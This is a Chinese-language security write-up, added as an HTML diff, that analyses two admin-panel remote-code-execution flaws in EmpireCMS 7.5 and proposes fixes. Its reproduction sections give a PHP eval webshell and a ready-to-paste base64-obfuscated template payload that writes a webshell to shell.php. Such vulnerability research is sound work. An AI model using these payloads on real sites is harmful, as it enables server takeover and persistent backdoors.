@@ -1,0 +1,114 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="aedbfcd240ad334e9bdd4b24017f456e">后台RCE-增加自定义页面</h2>
+<h3 data-content="1" id="bc4878ac7fa1d7609792db860f95c8c7">漏洞复现</h3>
+<p>这个漏洞挖掘最初来源于qclover师傅:<a href="http://qclover.cn/2018/10/10/EmpireCMS_V7.5%E7%9A%84%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1.html" target="_blank">EmpireCMS_V7.5的一次审计</a></p>
+<p>但是在这篇复现的文章中还是有一些出入的地方，比如说getshell的具体位置和成因。这里重新跟进分析一下</p>
+<p>首先看一下getshell的流程，这个洞有点像黑盒to白盒<br/>
+<img src="http://static.zybuluo.com/1160307775/2r4ccien35hlqw77mo8hrqzj/image_1dje3gco735q1k5m1f11n071a634r.png"/></p>
+<p>增加页面功能，会在程序根目录生成一个shell.php，访问为phpinfo结果<br/>
+<img src="http://static.zybuluo.com/1160307775/2zfoc03cbjv8woa3r5gjme49/image_1djdll0r410dk6ktm7stsgrlm.png"/></p>
+<p>但是在我写入其他木马时，例如<code>&lt;?php @eval($_REQUEST[hpdoger]);?&gt;</code>，根目录却生成了一个空的shell.php文件<br/>
+<img src="http://static.zybuluo.com/1160307775/48t49l1j0m30otcu25f646zv/image_1djdlqbum1gj217cp2d61d5f1hi613.png"/></p>
+<p>此时就有些疑问，推测真正的漏洞点应该不是在根目录写入一个php，应该另有它径，这里分析一下漏洞产生的真正成因。</p>
+<h3 data-content="1" id="940743b639d73efca16989d0556c443c">漏洞分析</h3>
+<p>入口在<code>e/admin/ecmscom.php</code>代码48行，跟进函数<code>AddUserpage</code><br/>
+<img src="http://static.zybuluo.com/1160307775/zdc2rmjeup4qfnqr5u9agc3j/image_1djdm53uj1m201n781ncr7ednrr1g.png"/></p>
+<p>重点关注两个参数的流程:path、pagetext<br/>
+<img src="http://static.zybuluo.com/1160307775/w2r7bolvqfafnju4ndirh0al/image_1djdm8m8l6ve645da3es96c51t.png"/></p>
+<p>步入<code>RepPhpAspJspcode</code>函数</p>
+<pre><code>function RepPhpAspJspcode($string){
+    global $public_r;
+    if(!$public_r[candocode]){
+        //$string=str_replace("&lt;?xml","[!--ecms.xml--]",$string);
+        $string=str_replace("&lt;\\","&lt;\\",$string);
+        $string=str_replace("\\&gt;","\\&gt;",$string);
+        $string=str_replace("&lt;?","&lt;?",$string);
+        $string=str_replace("&lt;%","&lt;%",$string);
+        if(@stristr($string,' language'))
+        {
+            $string=preg_replace(array('!&lt;script!i','!&lt;/script&gt;!i'),array('&lt;script','&lt;/script&gt;'),$string);
+        }
+        //$string=str_replace("[!--ecms.xml--]","&lt;?xml",$string);
+    }
+    return $string;
+}</code></pre>
+<p>这个函数用来对pagetext参数进行了php标签的实体化，但是empirecms默认<code>public_r[candocode]</code>为null，所以这里相当于直接返回了原始pagetext的值</p>
+<p>继续回到<code>AddUserpage</code>函数，接着步入<code>ReUserpage</code>函数，在e/class/functions.php的4281行<br/>
+<img src="http://static.zybuluo.com/1160307775/gyn1d0txofybrwzm1hu39r1a/image_1djdmv7bv17551oir15kv1do5sg42a.png"/></p>
+<p>获取程序的根路径后拼接传入的path，而后DoFileMKDir在根目录建立了shell.php</p>
+<p>接着步入<code>InfoNewsBq</code>函数，也是这个漏洞产生的函数。关键代码在<code>e/class/functions.php</code>的2469-2496行</p>
+<p><img src="http://static.zybuluo.com/1160307775/i3ri8ea5z4g4leh18tid1gig/image_1djdnbjo2pelbn91uh11ks21u8p2n.png"/></p>
+<p>$file参数以php结尾，通过<code>WriteFiletext</code>函数向$file中写入上一步的pagetext(这里为$indextext)，而<code>WriteFiletext</code>是没有任何过滤的</p>
+<pre><code>function WriteFiletext($filepath,$string){
+    global $public_r;
+    $string=stripSlashes($string);
+    $fp=@fopen($filepath,"w");
+    @fputs($fp,$string);
+    @fclose($fp);
+    if(empty($public_r[filechmod]))
+    {
+        @chmod($filepath,0777);
+    }
+}</code></pre>
+<p>于是在<code>e/data/tmp</code>目录下，以模版文件的形式写入webshell，同时也将AddCheckViewTempCode()返回的权鉴方法写了进去，所以我们不能直接以url的方式访问这个webshell。<br/>
+<img src="http://static.zybuluo.com/1160307775/zp17zrn2j1muego2qa7p9din/image_1djdo4l1d1gte63t1qcb1a73aho4e.png"/></p>
+<p>但是仍有方法使这个webshell执行并将结果输出。原因在下面这几行<br/>
+<img src="http://static.zybuluo.com/1160307775/ecp2rqbzer4w4xk8lw33ghcz/image_1djdnjf5p1b2p1oan4pqn7bd2434.png"/></p>
+<p>由于入口处定义了常量<code>InEmpireCMS</code>，ob_get_contents可以读取缓冲区的输出，而输出正好是刚才我们包含进去的shell的结果。因此执行了phpinfo()后将要输出到浏览器的内容赋值给了$string变量并返回，在<code>ReUserpage</code>函数中又进行了一次写入，缓冲结果写入的根目录下的shell.php，造成一个表面getshell的现象，其实是一种rce。</p>
+<p><img src="http://static.zybuluo.com/1160307775/ceu2e6w6h3a09qkm8krde4sx/image_1djdnpbbj180fdns1d2h1bvd1neu3h.png"/></p>
+<h3 data-content="1" id="2aec59fcb843c1d41fa68f49cea5d0a9">漏洞修复</h3>
+<p>设置<code>$public_r[candocode]</code>为true进行写入内容的过滤</p>
+<h2 data-content="1" id="66403139ca7c5ec4aa649cdd59e889f6">后台首页模版处rce到getshell</h2>
+<p>承接上一个漏洞，整个empirecms不少用到ob_get_contents的地方，所以就想挖掘一下还有没有其他可以利用的点，最后把眼光锁在增加模版处。</p>
+<h3 data-content="1" id="0ad2985386aa1a9b0caa263bf54d194b">漏洞复现</h3>
+<p>在后台模版功能处，选择管理首页模版，然后点击增加首页方案<br/>
+<img src="http://static.zybuluo.com/1160307775/92bdlk6m16ygken7p4xw18dj/image_1djp1p7ed1g6q1vs61qof19pb7cjm.png"/></p>
+<p>复制下面的payload，填写到模版内容处，点击提交。</p>
+<pre><code>&lt;?php 
+$aa = base64_decode(ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA);
+${(system)($aa)};
+?&gt;</code></pre>
+<p><img src="http://static.zybuluo.com/1160307775/86i5w3sopy8hik249iozojxo/image_1djp1rm8v2kc1s6l1f3b1g59cjk1g.png"/></p>
+<p>其中base64编码部分为</p>
+<pre><code>ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA
+=&gt;
+echo '&lt;?php eval($_REQUEST[hp]);'&gt;shell.php</code></pre>
+<p>再点击<strong>启用此方案</strong>即可getshell，在<code>e/admin/template/</code>目录下生成shell.php</p>
+<p><img src="http://static.zybuluo.com/1160307775/jck0izcors9rxr3b8ydk78gf/image_1djp21du0o250ocp31lnuad21t.png"/><br/>
+<img src="http://static.zybuluo.com/1160307775/jeakcfnhj6ljtu09tq4tcsnu/image_1djp23v55qua1pa11b021uir1qmp2a.png"/></p>
+<h3 data-content="1" id="2b8f5384b07c2c366bd2dd8f198fadba">漏洞分析</h3>
+<p>在e/class/functions.php的<code>NewsBq</code>函数中调用<code>WriteFiletext</code>函数向/e/data/tmp/index.php中写入文件并包含<br/>
+<img src="http://static.zybuluo.com/1160307775/vngxtn93avtnyhl4ix12mndr/image_1djp2kjth3i01l78dg91q3g1lba2n.png"/></p>
+<p>查找一下哪些地方调用<code>NewsBq</code>函数，最后锁定在<code>e/admin/template/ListIndexpage.php</code>的<code>DefIndexpage</code>中<br/>
+<img src="http://static.zybuluo.com/1160307775/w6dlwq628kgerrrfr67flxfq/image_1djp2t8jo6ej1l7t1ui9t9i734.png"/></p>
+<p>首先从库里获取得到<code>$r[temptext]</code>作为参数传入NewsBq，此时<code>$class</code>为null。那么文件内容可控吗？查看一下入库的语句，看看存不存在任意写入，全局搜索<code>enewsindexpage</code></p>
+<p>在同文件ListIndexpage.php的第23行到47行，调用insert语句向<code>enewsindexpage</code>中增加数据，关键代码如下</p>
+<pre><code>function AddIndexpage($add,$userid,$username){
+    global $empire,$dbtbpre;
+    if(!$add[tempname]||!$add[temptext])
+    {
+        printerror("EmptyIndexpageName","history.go(-1)");
+    }
+    ...
+    $add[tempname]=hRepPostStr($add[tempname],1);
+    $add[temptext]=RepPhpAspJspcode($add[temptext]);
+    $sql=$empire-&gt;query("insert into {$dbtbpre}enewsindexpage(tempname,temptext) values('".$add[tempname]."','".eaddslashes2($add[temptext])."');");
+    ...
+}</code></pre>
+<p>调用AddIndexpage的入口为：</p>
+<pre><code>$enews=$_POST['enews'];
+if(empty($enews))
+{$enews=$_GET['enews'];}
+
+if($enews=="AddIndexpage")
+{
+    AddIndexpage($_POST,$logininid,$loginin);
+}</code></pre>
+<p>所以<code>$add</code>为<code>$_POST</code>获取的数组，经过一次<code>eaddslashes2</code>函数清洗后以temptext字段存入库，而<code>eaddslashes2</code>在内部调用的是addslashes。猜想开发者最初可能只是为了防止sql注入，而没有进行其他类型过滤。但是我们执行任意命令是可以绕过addslashes的限制，取出来temptext字段来rce。</p>
+<p>只需要用到复杂变量：<a href="https://www.jianshu.com/p/7c818ddc5731" target="_blank">PHP复杂变量绕过addslashes()直接拿shell</a></p>
+<p>整理思路：入库rce语句-&gt;取出库-&gt;写文件-&gt;包含rce-&gt;getshell</p>
+<h3 data-content="1" id="406a559c5940655fe1a1b9ad1149e037">漏洞修复</h3>
+<p>对入库语句进行过滤，建议在<code>eaddslashes2</code>中增加一些过滤机制</p>
+</div>
+</div>
